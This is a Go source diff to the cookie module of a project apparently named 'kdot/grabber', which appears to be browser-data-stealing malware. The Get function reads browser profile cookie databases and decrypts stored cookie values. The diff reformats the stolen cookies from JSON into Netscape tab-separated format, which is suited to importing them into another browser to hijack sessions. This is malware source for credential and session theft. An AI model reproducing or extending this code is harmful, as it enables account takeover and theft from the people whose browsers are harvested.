@@ -2,7 +2,6 @@ package cookies
 
 import (
 	"database/sql"
-	"encoding/json"
 	"os"
 	"strings"
 
@@ -10,16 +9,8 @@ import (
 	"kdot/grabber/decryption"
 )
 
-type Cookies struct {
-	Host_key        string `json:"tab_url"`
-	Name            string `json:"name"`
-	Path_this       string `json:"path"`
-	Encrypted_value string `json:"encrypted_value"`
-	Expires_utc     string `json:"expires_utc"`
-}
-
 func Get() string {
-	var cookies []Cookies
+	var cookies string
 	dpPaths := util.GetBPth()
 	extraPaths := util.GetProfiles()
 	for _, path := range dpPaths {
@@ -66,13 +57,17 @@ func Get() string {
 				if err != nil {
 					decrypted = string(encrypted_value)
 				}
-				cookies = append(cookies, Cookies{host_key, name, path_this, decrypted, expires_utc})
+				expired := "TRUE"
+				if expires_utc == "0" {
+					expired = "FALSE"
+				}
+				tf_other := "TRUE"
+				if host_key[0] == '.' {
+					tf_other = "FALSE"
+				}
+				cookies = cookies + host_key + "\t" + expired + "\t" + path_this + "\t" + tf_other + "\t" + expires_utc + "\t" + name + "\t" + decrypted + "\n"
 			}
 		}
 	}
-	jsonData, err := json.MarshalIndent(cookies, "", "    ")
-	if err != nil {
-		return ""
-	}
-	return string(jsonData)
+	return cookies
 }
